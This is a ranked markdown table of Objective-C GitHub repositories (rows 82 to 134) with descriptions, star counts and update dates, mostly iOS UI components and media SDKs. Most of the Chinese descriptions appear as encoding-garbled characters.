|82|[AllLuckly/LBLaunchImageAd](https://github.com/AllLuckly/LBLaunchImageAd)|iOSÂºÄÂèëËΩªÈáèÁ∫ßÂêØÂä®ÂπøÂëäÔºåÂä®ÊÄÅËé∑ÂèñÁΩëÁªúÂêØÂä®ÂõæÁâáÔºåÂÖ∑ÊúâÊ∏êÂèòÁöÑÂêØÂä®Âä®ÁîªÔºåÊîØÊåÅÂçäÂ±èÂíåÂÖ®Â±èÔºåÁ±ª‰ººÁôæÂ∫¶sspÂπøÂëäÂíåÂπøÁÇπÈÄöÁöÑÂπøÂëä„ÄÇÊîØÊåÅÂπøÂëäÁÇπÂáªÁ≠âÔºåÈõÜÊàêÈùûÂ∏∏ÁöÑÊñπ‰æø„ÄÇÊ¨¢Ëøé‰ΩøÁî®ÔºåÂ•ΩÁî®ËØ∑star|556|Objective-C|04/10|
|83|[MacOMNI/MACProject](https://github.com/MacOMNI/MACProject)|ËøôÊòØ‰∏Ä‰∏™Áî® Objective-C ÂÜôÁöÑ iOS ËΩªÈáèÁ∫ßÊ°ÜÊû∂ÔºåÊó®Âú®Âø´ÈÄüÊûÑÂª∫ iOS AppÔºåÊ¨¢Ëøé Star|544|Objective-C|06/10|
|84|[wwmz/WMZDialog](https://github.com/wwmz/WMZDialog)|ÂäüËÉΩÊúÄÂ§öÊ†∑ÂºèÊúÄÂ§öÁöÑÂºπÁ™óÔºåÊîØÊåÅÊôÆÈÄö/ÂæÆ‰ø°Â∫ïÈÉ®/Êó•Êúü/Âú∞Âå∫/Êó•ÂéÜ/ÈÄâÊã©/ÁºñËæë/ÂàÜ‰∫´/ËèúÂçï/Ëá™ÂÆö‰πâÂºπÁ™óÁ≠â,ÊîØÊåÅÂ§öÁßçÂä®Áîª,ÈìæÂºèÁºñÁ®ãË∞ÉÁî®(Pop-up windows with the most functions and styles, support normal/WeChat bottom/date/region/calendar/select/edit/share/menu/custom pop-up windows, etc., support multiple animations, chain programming calls)|532|Objective-C|10/21|
|85|[anyrtcIO-Community/anyRTC-RTMPC-iOS](https://github.com/anyrtcIO-Community/anyRTC-RTMPC-iOS)|Âü∫‰∫éRTMPÂíåRTCÊ∑∑ÂêàÂºïÊìéÁöÑËßÜÈ¢ëËøûÈ∫¶‰∫íÂä®Áõ¥Êí≠|527|Objective-C|02/28|
|86|[gaojunquan/JQFMDB](https://github.com/gaojunquan/JQFMDB)|FMDBÁöÑÂ∞ÅË£Ö,Êìç‰ΩúÁÆÄÂçï,Á∫øÁ®ãÂÆâÂÖ®,Êâ©Â±ïÊÄßÂº∫,Áõ¥Êé•Êìç‰ΩúmodelÊàñdictionary|523|Objective-C|04/12|
|87|[ihoudf/DFPlayer](https://github.com/ihoudf/DFPlayer)|ÁÆÄÂçïÁÅµÊ¥ªÁöÑiOSÈü≥È¢ëÊí≠ÊîæÁªÑ‰ª∂„ÄÇÂü∫‰∫éAVPlayerÔºåÊîØÊåÅÊú¨Âú∞ÂíåËøúÁ®ãÈü≥È¢ëÊí≠ÊîæÔºåÂÖ∑ÊúâÁºìÂ≠ò„ÄÅËÄ≥Êú∫Á∫øÊéß„ÄÅÈîÅÂ±èÂíåÊéßÂà∂‰∏≠ÂøÉ‰ø°ÊÅØÂ±ïÁ§∫„ÄÅÂçïÊõ≤È°∫Â∫èÈöèÊú∫Êí≠Êîæ„ÄÅÂÄçÈÄüÊí≠Êîæ„ÄÅÊ≠åËØçÂêåÊ≠•Á≠âÈü≥È¢ëÊí≠ÊîæÂô®ÂäüËÉΩÔºåDFPlayerÂ∞ÅË£Ö‰∫ÜÁºìÂÜ≤Êù°„ÄÅËøõÂ∫¶Êù°„ÄÅÊí≠ÊîæÊöÇÂÅúÊåâÈíÆ„ÄÅ‰∏ã‰∏ÄÈ¶ñÊåâÈíÆ„ÄÅ‰∏ä‰∏ÄÈ¶ñÊåâÈíÆ„ÄÅÊí≠ÊîæÊ®°ÂºèÊåâÈíÆ„ÄÅÊ≠åËØçÂêåÊ≠•ÁöÑtableviewÁ≠âUIÊéß‰ª∂Ôºå‰∏ÄË°å‰ª£Á†ÅÂ∏ÉÂ±ÄÂç≥ÂèØÂÆûÁé∞Áõ∏Â∫îÂäüËÉΩ„ÄÇ|513|Objective-C|04/30|
|88|[pili-engineering/PLMediaStreamingKit](https://github.com/pili-engineering/PLMediaStreamingKit)|PLMediaStreamingKit ÊòØ‰∏ÉÁâõÊé®Âá∫ÁöÑ‰∏ÄÊ¨æÈÄÇÁî®‰∫é iOS Âπ≥Âè∞ÁöÑÊé®ÊµÅ SDKÔºåÊîØÊåÅ RTMP Êé®ÊµÅÔºåh.264 Âíå AAC ÁºñÁ†ÅÔºåÁ°¨Áºñ„ÄÅËΩØÁºñÊîØÊåÅ„ÄÇÂÖ∑Êúâ‰∏∞ÂØåÁöÑÊï∞ÊçÆÂíåÁä∂ÊÄÅÂõûË∞ÉÔºåÊñπ‰æøÁî®Êà∑Ê†πÊçÆËá™Â∑±ÁöÑ‰∏öÂä°ÂÆöÂà∂ÂåñÂºÄÂèë„ÄÇÂÖ∑ÊúâÁõ¥Êí≠Âú∫ÊôØ‰∏ãÁöÑÈáçË¶ÅÂäüËÉΩÔºåÂ¶ÇÔºöÁæéÈ¢ú„ÄÅËÉåÊôØÈü≥‰πê„ÄÅÊ∞¥Âç∞Á≠âÂäüËÉΩ„ÄÇ|511|Objective-C|09/18|
|89|[ksvc/KSYMediaPlayer_iOS](https://github.com/ksvc/KSYMediaPlayer_iOS)|ÈáëÂ±±‰∫ëiOSÊí≠ÊîæSDKÔºàKSYUN Live Streaming player SDKÔºâÔºåÊîØÊåÅRTMP HTTP-FLV HLS ÂçèËÆÆÔºàsupporting RTMP HTTP-FLV HLS protocolÔºâÔºåÁõ¥Êí≠Âª∂Êó∂2-3ÁßíÔºàLiving delay 2 or 3 secondsÔºâ|495|Objective-C|05/12|
|90|[Rogue24/JPImageresizerView](https://github.com/Rogue24/JPImageresizerView)|‰∏Ä‰∏™‰∏ìÈó®Ë£ÅÂâ™ÂõæÁâá„ÄÅGIF„ÄÅËßÜÈ¢ëÁöÑËΩÆÂ≠êüòã ÁÆÄÂçïÊòìÁî®„ÄÅÂäüËÉΩ‰∏∞ÂØå‚òïÔ∏èÔºàÈ´òËá™Áî±Â∫¶ÁöÑÂèÇÊï∞ËÆæÂÆö„ÄÅÊîØÊåÅÊóãËΩ¨ÂíåÈïúÂÉèÁøªËΩ¨„ÄÅËíôÁâà„ÄÅÂéãÁº©Á≠âÔºâÔºåËÉΩÊª°Ë∂≥ÁªùÂ§ßÈÉ®ÂàÜË£ÅÂâ™ÁöÑÈúÄÊ±Ç„ÄÇ|462|Objective-C|10/25|
|91|[DKJone/DKWechatHelper](https://github.com/DKJone/DKWechatHelper)|‰∏çÊ≠¢‰∫éÊä¢Á∫¢ÂåÖÔºåÂäüËÉΩ‰∏∞ÂØåÁöÑÂæÆ‰ø°Êèí‰ª∂„ÄÇ|460|Objective-C|10/16|
|92|[CoderMJLee/MJAppTools](https://github.com/CoderMJLee/MJAppTools)|„ÄêË∂äÁã±-ÈÄÜÂêë„ÄëÂ§ÑÁêÜiOS APP‰ø°ÊÅØÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑|449|Objective-C|08/28|
|93|[xiangwangfeng/M80ImageMerger](https://github.com/xiangwangfeng/M80ImageMerger)|Êà™ÂõæËá™Âä®ÊãºÊé•Â∞èÂ∑•ÂÖ∑|434|Objective-C|10/16|
|94|[loyinglin/LearnVideoToolBox](https://github.com/loyinglin/LearnVideoToolBox)|Èü≥ËßÜÈ¢ëÁöÑÂÆûË∑µÔºåh264ÁöÑÁºñËß£Á†ÅÔºåaacÁöÑÁºñËß£Á†ÅÔºåAudio UnitÂêÑÁßçÂÆûË∑µ|431|Objective-C|03/17|
|95|[wwmz/WMZDropDownMenu](https://github.com/wwmz/WMZDropDownMenu)|üåπ‰∏Ä‰∏™ËÉΩÂá†‰πéÂÆûÁé∞ÊâÄÊúâAppÂêÑÁßçÁ±ªÂûãÁ≠õÈÄâËèúÂçïÁöÑÊéß‰ª∂,ÂèØÊÇ¨ÊµÆ,ÁõÆÂâçÂ∑≤ÂÆûÁé∞Èó≤È±º/ÁæéÂõ¢/BossÁõ¥ËÅò/‰∫¨‰∏ú/È•ø‰∫Ü‰πà/Ê∑òÂÆù/ÊãºÂ§öÂ§ö/Ëµ∂ÈõÜÁΩë/ÁæéÂõæÂ§ñÂçñÁ≠âÁ≠âÁöÑÁ≠õÈÄâËèúÂçï,ÂèØ‰ª•Ëá™Áî±Ë∞ÉÁî®‰ª£ÁêÜÂÆûÁé∞Ëá™Â∑±ÊÉ≥ÁªÑË£ÖÁöÑÁ≠õÈÄâÂäüËÉΩÂíåUI,‰∏îÊéß‰ª∂ÁöÑÁîüÂëΩÂë®ÊúüËá™Âä®ÁÆ°ÁêÜ,ÊÇ¨ÊµÆËá™Âä®ÁÆ°ÁêÜüåπ(A control that can implement almost all types of filtering menus of all apps)|430|Objective-C|10/28|
|96|[Bonway/BBGestureBack](https://github.com/Bonway/BBGestureBack)|üî•OC and Swift full screen return gestureüî•ÔºàÁ∫ØOC Âíå Á∫ØSwiftÁºñÂÜôÔºåÁ±ªÊ∑òÂÆù„ÄÅ‰∫¨‰∏úÁ≠âÂÖ®Â±èÊªëÂä®ËøîÂõûÊïàÊûúÔºâ|427|Objective-C|07/02|
|97|[maltsugar/RollingNotice](https://github.com/maltsugar/RollingNotice)|ÊâÄÊúâÁöÑÂûÇÂêëÊªöÂ±èËøô‰∏Ä‰∏™Â∫ìÂ∞±Â§ü‰∫ÜÔºÅÔºÅÔºÅÊªöÂä®ÂÖ¨Âëä„ÄÅËΩÆÊí≠ÂπøÂëäÔºåÊîØÊåÅÁÅµÊ¥ªËá™ÂÆö‰πâcell„ÄÇÊ∑òÂÆù„ÄÅÂè£Á¢ë„ÄÅ‰∫¨‰∏ú„ÄÅÁæéÂõ¢„ÄÅÂ§©Áå´Á≠âÁ≠â‰∏ÄÂàáÊªöÂä®ÂπøÂëä Roll Notice or Advertising, customize cell as UITableViewCell supported, Swift version is also ready|426|Objective-C|04/15|
|98|[Liaoworking/GHConsole](https://github.com/Liaoworking/GHConsole)|An elegant and easy way to show a console in your app. ‰∏ÄÁßç‰ºòÈõÖÁÆÄÂçïÁöÑÊñπÂºèÂú®app‰∏≠ÊòæÁ§∫ÊéßÂà∂Âè∞„ÄÇ|413|Objective-C|07/03|
|99|[MobClub/ShareSDK-for-iOS](https://github.com/MobClub/ShareSDK-for-iOS)|Âø´Êç∑Â•ΩÁî®ÁöÑÁ§æ‰ºöÂåñÂàÜ‰∫´ÁªÑ‰ª∂ Convenient SDK for SNS Share Feature|412|Objective-C|10/21|
|100|[MustangYM/WeChatICU-ForMac](https://github.com/MustangYM/WeChatICU-ForMac)|MacÁâà‰ºÅ‰∏öÂæÆ‰ø°Ê∂àÊÅØÈò≤Êí§Âõû, ËÅäÂ§©‰ºöËØùÂéªÊ∞¥Âç∞|410|Objective-C|09/20|
|101|[loyinglin/LearnMetal](https://github.com/loyinglin/LearnMetal)|Metal ÂÖ•Èó®ÊïôÁ®ã|408|Objective-C|03/17|
|102|[OpenFlutter/tobias](https://github.com/OpenFlutter/tobias)|AliPay For Flutter.ÊîØ‰ªòÂÆùFlutterÊèí‰ª∂|406|Objective-C|08/12|
|103|[g0v/moedict-webkit](https://github.com/g0v/moedict-webkit)|ËêåÂÖ∏Á∂≤Á´ô|405|Objective-C|10/18|
|104|[SPStore/SPPageMenu](https://github.com/SPStore/SPPageMenu)|ÂàÜÈ°µËèúÂçïÔºåÂäüËÉΩÈùûÂ∏∏ÈΩêÂÖ®ÔºåÊª°Ë∂≥ÁªùÂ§ßÂ§öÊï∞APPÔºåÁÆÄ‰π¶Âú∞ÂùÄ:|397|Objective-C|05/15|
|105|[ziecho/ZYNetworkAccessibility](https://github.com/ziecho/ZYNetworkAccessibility)|ÈíàÂØπ iOS ÁΩëÁªúÊùÉÈôêÁöÑÁõëÊéßÂíåÂà§Êñ≠|397|Objective-C|09/01|
|106|[pili-engineering/PLShortVideoKit](https://github.com/pili-engineering/PLShortVideoKit)|PLShortVideoKit ÊòØ‰∏ÉÁâõÊé®Âá∫ÁöÑ‰∏ÄÊ¨æÈÄÇÁî®‰∫é iOS Âπ≥Âè∞ÁöÑÁü≠ËßÜÈ¢ë SDKÔºåÊèê‰æõ‰∫ÜÂåÖÊã¨ÁæéÈ¢ú„ÄÅÊª§Èïú„ÄÅÊ∞¥Âç∞„ÄÅÊñ≠ÁÇπÂΩïÂà∂„ÄÅÂàÜÊÆµÂõûÂà†„ÄÅËßÜÈ¢ëÁºñËæë„ÄÅÊ∑∑Èü≥ÁâπÊïà„ÄÅËßÜÈ¢ëÂâ™Ëæë„ÄÅÊú¨Âú∞ËΩ¨Á†Å„ÄÅËßÜÈ¢ë‰∏ä‰º†Âú®ÂÜÖÁöÑÂ§öÁßçÂäüËÉΩÔºåÊîØÊåÅÈ´òÂ∫¶ÂÆöÂà∂‰ª•Âèä‰∫åÊ¨°ÂºÄÂèë„ÄÇ|392|Objective-C|10/28|
|107|[SPStore/SPAlertController](https://github.com/SPStore/SPAlertController)|ÊèêÈÜíÂØπËØùÊ°ÜÔºåÈ£éÊ†ºÂíåÂæÆ‰ø°ÂéüÁîüÂá†‰πéÈõ∂ËØØÂ∑Æ„ÄÇÁÆÄ‰π¶Âú∞ÂùÄ:|383|Objective-C|05/06|
|108|[tbl00c/ZZFLEX](https://github.com/tbl00c/ZZFLEX)|‰∏Ä‰∏™ÂÆåÂñÑÁöÑiOSÊïèÊç∑ÂºÄÂèëÊ°ÜÊû∂ÔºåÂü∫‰∫éUIKitÂÆûÁé∞ÔºåÂåÖÂê´Â∏∏Áî®Êéß‰ª∂ÁöÑÈìæÂºèAPIÊãìÂ±ï„ÄÅ‰∏Ä‰∏™Êï∞ÊçÆÈ©±Âä®ÁöÑÂàóË°®Ê°ÜÊû∂„ÄÅ‰∏Ä‰∏™‰∫ã‰ª∂Â§ÑÁêÜÈòüÂàó„ÄÇ|380|Objective-C|09/24|
|109|[lincf0912/LFMediaEditingController](https://github.com/lincf0912/LFMediaEditingController)|Media Editor (ÂõæÁâáÁºñËæë„ÄÅËßÜÈ¢ëÁºñËæë)|378|Objective-C|10/28|
|110|[MxABC/LBXPermission](https://github.com/MxABC/LBXPermission)|iOSÂ∏∏Áî®ÊùÉÈôêËØ∑Ê±ÇÂà§Êñ≠|375|Objective-C|10/15|
|111|[zzyspace/ZYBannerView](https://github.com/zzyspace/ZYBannerView)|ÁÆÄÂçïÊòìÁî®, ÊòæÁ§∫ÂÜÖÂÆπÂÆöÂà∂ÊÄßÂº∫ÁöÑÂèØÂæ™ÁéØËΩÆÊí≠Êéß‰ª∂. ÂèØ‰ª•ÂÆûÁé∞Á±ª‰ººÊ∑òÂÆùÂïÜÂìÅËØ¶ÊÉÖ‰∏≠‰æßÊãâËøõÂÖ•ËØ¶ÊÉÖÈ°µÁöÑÂäüËÉΩ. |372|Objective-C|03/24|
|112|[karosLi/KKJSBridge](https://github.com/karosLi/KKJSBridge)|‰∏ÄÁ´ôÂºèËß£ÂÜ≥ WKWebView ÊîØÊåÅÁ¶ªÁ∫øÂåÖÔºåAjax/Fetch ËØ∑Ê±ÇÔºåË°®ÂçïËØ∑Ê±ÇÂíå Cookie ÂêåÊ≠•ÁöÑÈóÆÈ¢ò (Âü∫‰∫é Ajax HookÔºåFetch Hook Âíå Cookie Hook)|372|Objective-C|10/21|
|113|[sensorsdata/sa-sdk-ios](https://github.com/sensorsdata/sa-sdk-ios)|Á•ûÁ≠ñÊï∞ÊçÆÂÆòÊñπ iOS ÂüãÁÇπ SDKÔºåÊòØ‰∏ÄÊ¨æËΩªÈáèÁ∫ßÁî®‰∫é iOS Á´ØÁöÑÊï∞ÊçÆÈááÈõÜÂüãÁÇπ SDK„ÄÇÁ•ûÁ≠ñÂàÜÊûê iOS SDK ‰∏ç‰ªÖÊúâ‰ª£Á†ÅÂüãÁÇπÂäüËÉΩÔºåËøòÈÄöËøá‰ΩøÁî®ËøêË°åÊó∂Êú∫Âà∂ÔºàRuntimeÔºâ‰∏≠ÁöÑÁõ∏ÂÖ≥ÊäÄÊúØÂÆûÁé∞ iOS Á´ØÁöÑÂÖ®ÂüãÁÇπÔºàÊó†ÂüãÁÇπ„ÄÅÊó†Á†ÅÂüãÁÇπ„ÄÅÊó†ÁóïÂüãÁÇπ„ÄÅËá™Âä®ÂüãÁÇπÔºâ„ÄÅÁÇπÂáªÂõæ„ÄÅÂèØËßÜÂåñÂÖ®ÂüãÁÇπ„ÄÇ|367|Objective-C|10/27|
|114|[QuintGao/GKDYVideo](https://github.com/QuintGao/GKDYVideo)|iOS‰ªøÊäñÈü≥Áü≠ËßÜÈ¢ë|359|Objective-C|05/09|
|115|[2621532542/iOS_NQConfuseTool](https://github.com/2621532542/iOS_NQConfuseTool)|iOS‰ª£Á†ÅÊ∑∑Ê∑Ü(iOS_NQConfuseTool)ÊòØ‰∏ÄÊ¨æËøêË°åÂú®MACOSÂπ≥Âè∞ÁöÑApp„ÄÅÂÆåÁæéÊîØÊåÅOCÂíåSwiftÈ°πÁõÆ‰ª£Á†ÅÁöÑËá™Âä®Ê∑∑Ê∑Ü„ÄÅÊîØÊåÅ„ÄÅÊñá‰ª∂Âêç„ÄÅ‰øÆÊîπËµÑÊ∫êÊñá‰ª∂„ÄÅÁ±ªÂêç„ÄÅÊñπÊ≥ïÂêç„ÄÅÂ±ûÊÄßÂêç„ÄÅÊ∑ªÂä†Ê∑∑Ê∑ÜÂáΩÊï∞ÊñπÊ≥ï‰Ωì„ÄÅÊ∑ªÂä†Ê∑∑Ê∑ÜÂ±ûÊÄß„ÄÅËá™Âä®Ë∞ÉÁî®ÁîüÊàêÁöÑÊ∑∑Ê∑Ü‰ª£Á†ÅÔºåÂäüËÉΩÂº∫Â§ßËÄåÁ®≥ÂÆöÔºåÂÖ®Â±ÄËá™Âä®ÂåñÔºåÂÆâÂÖ®Âä†Âõ∫„ÄÇÈ©¨Áî≤ÂåÖÊ∑∑Ê∑ÜÂ∑•ÂÖ∑ÔºåÊúÄÈáçË¶ÅÁöÑÊòØÂÆåÂÖ®ÂÖçË¥π„ÄÇÔºàÈöèÊú∫ÂçïËØçÊãºÊé•Ôºâ|355|Objective-C|09/12|
|116|[zhu410289616/RHSocketKit](https://github.com/zhu410289616/RHSocketKit)|socketÁΩëÁªúÈÄö‰ø°Ê°ÜÊû∂ Ôºç qq: 410289616  Ôºç  qqÁæ§2: 371293816  qqÁæ§3: 231199626|344|Objective-C|06/25|
|117|[LeoMobileDeveloper/QTEventBus](https://github.com/LeoMobileDeveloper/QTEventBus)|iOS‰∫ã‰ª∂ÊÄªÁ∫øÔºåÊîØÊåÅAppDelegateËß£ËÄ¶ÔºåÊîØÊåÅÂü∫‰∫éÂìçÂ∫îÈìæÁöÑÂ±ÄÈÉ®ÊÄªÁ∫ø|339|Objective-C|06/24|
|118|[sealtalk/sealtalk-ios](https://github.com/sealtalk/sealtalk-ios)|iOS App of SealTalk powered by RongCloud. Âü∫‰∫éËûç‰∫ëÂºÄÂèëÁöÑ iOS ÁâàÂç≥Êó∂ÈÄöËÆØÔºàIMÔºâÂ∫îÁî®Á®ãÂ∫è - Âó®Ë±π„ÄÇ|338|Objective-C|09/21|
|119|[AbuIOSDeveloper/KLine](https://github.com/AbuIOSDeveloper/KLine)|(CAShapelayer + UIBezierPath)ÁªòÂà∂KÁ∫øÊîØÊíëÊ®™Á´ñÂ±èÂàáÊç¢„ÄÅÂà∑Êñ∞„ÄÅÈïøÊåâ„ÄÅÁº©Êîæ„ÄÅmasonryÈÄÇÈÖçÔºåÂÆåÁæéÊîØÊåÅÈáëËûç‰∫ßÂìÅ ÈùûÂ∏∏ÁöÑÊµÅÁïÖÔºåÂç†Áî®ÂÜÖÂ≠òÂ∞ëÔºå‰ΩøÁî®Áü¢ÈáèËøõË°åÂ°´ÂÖÖKÁ∫øÔºåÊåÅÁª≠Êõ¥Êñ∞ÔºåÊúâÈóÆÈ¢òËØ∑Ê∑ªÂä†QQ:2438100263 ÂñúÊ¨¢ÁöÑÂèØ‰ª•Ê∑ªÂä†Áæ§Ôºö362681337|337|Objective-C|02/28|
|120|[starrtc/starrtc-ios-demo](https://github.com/starrtc/starrtc-ios-demo)|üöÄstarRTCÔºåÂÖçË¥πIMÔºàÂê´ÂçïËÅäÔºåÁæ§ËÅäÔºåËÅäÂ§©ÂÆ§ÔºâÔºåÂÖçË¥π‰∏ÄÂØπ‰∏ÄËßÜÈ¢ëËÅäÂ§©ÔºàÂõûÈü≥Ê∂àÈô§ÔºâÔºåËØ≠Èü≥ËÅäÂ§©ÔºåÁõ¥Êí≠ËøûÈ∫¶ÔºåÁôΩÊùøÔºåÂ∞èÁè≠ËØæÔºåÂ§ö‰∫∫‰ºöËÆÆÔºåÂ±ÄÂüüÁΩëÊó†ÊúçÂä°Âô®Áõ¥ËøûÔºåÂÖºÂÆπwebRTC, ÊîØÊåÅwebRTCÂä†ÈÄüÔºåP2PÈ´òÊ∏Ö‰º†ËæìÔºåÂÆâÂçì„ÄÅiOS„ÄÅweb‰∫íÈÄöÔºåÊîØÊåÅÈó®Á¶ÅÂèØËßÜÂØπËÆ≤ÔºåÁîµËßÜÁõíÂ≠êÔºåÊ†ëËéìÊ¥æÔºåÊµ∑ÊÄùÔºåÂÖ®ÂøóÔºåOTTËÆæÂ§áÔºåCËØ≠Ë®ÄËá™Á†îÊñπÊ°àÔºå‚ú®‰∏áÊ∞¥ÂçÉÂ±±ÊÄªÊòØÊÉÖÔºåÊù•‰∏™starË°å‰∏çË°å‚ú®ÔºåÊõ¥Â§öÁ§∫‰æãËØ∑ËÆøÈóÆ|328|Objective-C|07/10|
|121|[wsl2ls/WKWebView](https://github.com/wsl2ls/WKWebView)|WKWebViewÁöÑ‰ΩøÁî®„ÄÅJSÂíåOCÁöÑ‰∫§‰∫í„ÄÅÁΩëÈ°µÂÜÖÂÆπÂä†ËΩΩËøõÂ∫¶Êù°ÁöÑÂÆûÁé∞„ÄÅWKWebView+UITableViewÊ∑∑Êéí „ÄÅ WKWebViewÁ¶ªÁ∫øÁºìÂ≠ò|327|Objective-C|06/18|
|122|[liangdahong/UITableViewDynamicLayoutCacheHeight](https://github.com/liangdahong/UITableViewDynamicLayoutCacheHeight)|üññÈ´òÊÄßËÉΩÁöÑËá™Âä®ËÆ°ÁÆóÈááÁî® Autolayout Â∏ÉÂ±ÄÁöÑ UITableViewCell Âíå UITableViewHeaderFooterView ÁöÑÈ´òÂ∫¶ÔºåÂÜÖÈÉ®Ëá™Âä®ÁÆ°ÁêÜÈ´òÂ∫¶ÁºìÂ≠ò„ÄÇ|327|Objective-C|10/09|
|123|[zhifenx/JFCitySelector](https://github.com/zhifenx/JFCitySelector)|ËΩªÈáè„ÄÅÁÅµÊ¥ª„ÄÅÂèØËá™ÂÆö‰πâÁöÑ‰∏âÁ∫ßÂüéÂ∏ÇÈÄâÊã©Âô®|326|Objective-C|07/30|
|124|[ArchLL/HGPersonalCenterExtend](https://github.com/ArchLL/HGPersonalCenterExtend)|Ëß£ÂÜ≥UIScrollViewÂµåÂ•óÊªëÂä®ÊâãÂäøÂÜ≤Á™ÅÈóÆÈ¢òÔºåÈÄÇÁî®‰∫éÂ§çÊùÇÁöÑÈ¶ñÈ°µÊàñ‰∏™‰∫∫‰∏ªÈ°µ|326|Objective-C|08/15|
|125|[yuping1989/YPTabBarController](https://github.com/yuping1989/YPTabBarController)|ÂäüËÉΩÂº∫Â§ßÔºå‰ΩøÁî®Êñπ‰æøÔºåÂèØÈ´òÂ∫¶Ëá™ÂÆö‰πâÁöÑTabBarController„ÄÇ|325|Objective-C|09/18|
|126|[reactnativecomponent/react-native-chat-demo](https://github.com/reactnativecomponent/react-native-chat-demo)|ÁΩëÊòì‰∫ë‰ø°IMÁ§∫‰æã|323|Objective-C|10/17|
|127|[Dzhijian/ZJKitTool](https://github.com/Dzhijian/ZJKitTool)|iOSÂºÄÂèëÂø´ÈÄüÊ∑ªÂä†UIKitÊéß‰ª∂ÂèØ‰ª•ÁªìÂêàMasonryÔºåÈìæÂºèËØ≠Ê≥ïÔºå‰ª•ÂèäÂÖ∂‰ªñÂ∑•ÂÖ∑Á±ªÁöÑÁÆÄÂçï‰ΩøÁî®,ËØÑËÆ∫ÂàóË°®„ÄÅÁÄëÂ∏ÉÊµÅ„ÄÅÂéãÁº©ÂõæÁâá„ÄÅÂÄíËÆ°Êó∂„ÄÅÁ≠õÈÄâ„ÄÅ Ëá™ÂÆö‰πâPickerView Êó∂Èó¥Êó•ÊúüÈÄâÊã©Âô®„ÄÅÊÄßÂà´ÈÄâÊã©Âô®„ÄÅWKWebView ÁöÑÂ∫îÁî®Ôºå‰∏çÊñ≠Êõ¥Êñ∞‰∏≠„ÄÇ„ÄÇ„ÄÇ„ÄÇ|321|Objective-C|04/08|
|128|[FantasticLBP/Hotels](https://github.com/FantasticLBP/Hotels)|ÈÖíÂ∫óÈ¢ÑËÆ¢App|320|Objective-C|09/06|
|129|[boai/BANetManager](https://github.com/boai/BANetManager)|Âü∫‰∫éAFNetworking 3.0„ÄÅ3.1ÊúÄÊñ∞ÁâàÊú¨ÁöÑÂ∞ÅË£ÖÔºåÈõÜÊàê‰∫Ü get / post / put / delete ÊñπÊ≥ïËØ∑Ê±ÇÊï∞ÊçÆÔºåÂçïÂõæ/Â§öÂõæ‰∏ä‰º†ÔºåËßÜÈ¢ë‰∏ä‰º†/‰∏ãËΩΩÔºåÁΩëÁªúÁõëÊµã Á≠âÂ§öÁßçÁΩëÁªúËØ∑Ê±ÇÊñπÂºèÔºå|319|Objective-C|05/11|
|130|[Soulghost/SGWiFiUpload](https://github.com/Soulghost/SGWiFiUpload)|Upload files through WiFi. ÈÄöËøáWiFi‰∏ä‰º†Êñá‰ª∂|315|Objective-C|03/08|
|131|[donggelaile/HDCollectionView](https://github.com/donggelaile/HDCollectionView)|An efficient and flexible listView (data driven). Based on Flexbox, it supports floating, waterfall, decorative view, horizontal sliding, segmented layout, and various alignments. Support diff refresh, animation update UI  /  Êï∞ÊçÆÈ©±Âä®(data driven)ÁöÑÈ´òÊïàÁÅµÊ¥ªÂàóË°®„ÄÇÂü∫‰∫éFlexboxÔºåÊîØÊåÅ ÊÇ¨ÊµÆ„ÄÅÁÄëÂ∏ÉÊµÅ„ÄÅË£ÖÈ•∞view„ÄÅÊ®™ÂêëÊªëÂä®„ÄÅÂàÜÊÆµÂ∏ÉÂ±Ä„ÄÅÂêÑÁßçÂØπÈΩêÊñπÂºè„ÄÇÊîØÊåÅÈìæÂºèËØ≠ ...|314|Objective-C|08/31|
|132|[wwmz/WMZPageController](https://github.com/wwmz/WMZPageController)|ÂàÜÈ°µÊéßÂà∂Âô®,ÊõøÊç¢UIPageControllerÊñπÊ°à,ÂÖ∑Â§áÂÆåÊï¥ÁöÑÁîüÂëΩÂë®Êúü,Â§öÁßçÊåáÁ§∫Âô®Ê†∑Âºè,Â§öÁßçÊ†áÈ¢òÊ†∑Âºè,ÂèØÊÇ¨ÊµÆ,ÊîØÊåÅios13ÊöóÈªëÊ®°Âºè(‰ªø‰ºòÈÖ∑,Áà±Â•áËâ∫,‰ªäÊó•Â§¥Êù°,ÁÆÄ‰π¶,‰∫¨‰∏úÁ≠âÂ§öÁßçÊ†áÈ¢òËèúÂçï) (Pagination controller with full life cycle, multiple indicator styles, multiple title styles)|313|Objective-C|10/22|
|133|[wubianxiaoxian/PureCamera-Demo](https://github.com/wubianxiaoxian/PureCamera-Demo)|‰∏Ä‰∏™Ëá™ÂÆö‰πâÁõ∏Êú∫ÔºåÊãçÁÖßÂÆåÊï¥ÂèØ‰ª•Ëá™Áî±Ë£ÅÂâ™|308|Objective-C|05/14|
|134|[dev-liyang/LYCustomTransition](https://github.com/dev-liyang/LYCustomTransition)|iOSËá™ÂÆö‰πâ‰∫§‰∫íÂºèËΩ¨Âú∫Âä®Áîª-‰ªøÂæÆ‰ø°ÂõæÁâáÊµèËßàÂô®ËΩ¨Âú∫Âä®Áîª„ÄÅ‰ªøiOSÁ≥ªÁªüÁõ∏ÂÜåÂõæÁâáÊµèËßàËΩ¨Âú∫Âä®Áîª„ÄÅ‰ªøÈÖ∑ÁãóËΩ¨Âú∫Âä®Áîª + ‰∫§‰∫íÂºèÂõæÁâáÊµèËßàÂô®|306|Objective-C|06/23|
